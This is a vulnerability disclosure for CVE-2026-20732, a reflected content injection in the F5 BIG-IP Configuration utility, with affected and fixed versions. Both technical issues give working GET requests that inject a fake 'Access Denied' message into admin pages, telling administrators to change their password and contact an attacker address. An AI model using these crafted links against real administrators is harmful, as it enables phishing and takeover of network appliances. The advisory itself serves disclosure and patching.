# CVE-2026-20732

F5 BIG-IP Configuration Utility - Reflected Content Injection

## Timeline

* **Vulnerability reported to vendor:** 04.09.2025
* **Public disclosure:** 04.02.2026

## Description

A Reflected Content Injection vulnerability has been identified in the F5 BIG-IP Configuration utility (TMUI). This flaw occurs because user-supplied data from URL parameters is reflected directly into the server response of specific administrative endpoints without sufficient validation or output encoding.

A malicious actor can leverage this vulnerability by crafting a malicious link that, when accessed by an authenticated user, renders arbitrary text within the security context of the management interface. While modern browser protections and the application's Content Security Policy (CSP) prevent the execution of arbitrary scripts (XSS), the vulnerability remains a significant risk for social engineering. Attackers can display fraudulent system warnings, error messages, or password reset instructions to deceive administrators into disclosing sensitive information or performing unauthorized actions.

The vulnerability is exploitable via `GET` requests to multiple endpoints within the TMUI and DMS components.

## Technical Analysis

### Issue 1: Logical Disk Properties
The `name` parameter in the logical disk properties page is reflected without sanitization inside a `warning` div.

**Request:**
```http
GET /tmui/Control/jspmap/tmui/system/disk_management/logical_disk_properties.jsp?name=%20ERROR.+Access+Denied.+Please+change+your+password+to+'Afine'+and+immediately+contact+your+administrator+via+attacker@example.com.&slot_id=0 HTTP/1.1

```

**Response Snippet:**
```html
<div class="warning">
    Instance not found: ERROR. Access Denied. Please change your password to 'Afine' and immediately contact your administrator via attacker@example.com.
</div>
```

### Issue 2: DMS Help Tab
The `page` parameter in the help system renders unsanitized input directly into the help text area.

**Request:**
```http
GET /dms/xui/tab_help.php?page=/dms/amm/tcp_stats_rtt.php.+Unknow+error+occured.+Please+change+your+password+to+Afine+and+contact+your+administrator+via+attacker@example.com.+Reason HTTP/1.1

## Affected versions

* **BIG-IP (all modules):** 17.5.0 - 17.5.1
* **BIG-IP (all modules):** 17.1.0 - 17.1.3
* **BIG-IP (all modules):** 16.1.0 - 16.1.6

## Advisory

F5 has addressed this issue in the February 2026 Quarterly Security Notification. Users should update to the following versions or later:

* **BIG-IP 17.5.1.4**
* **BIG-IP 17.1.3.1**

If applying the update is not immediately feasible, it is strongly recommended to restrict access to the BIG-IP Configuration utility to only trusted networks and log off from the interface after each session.
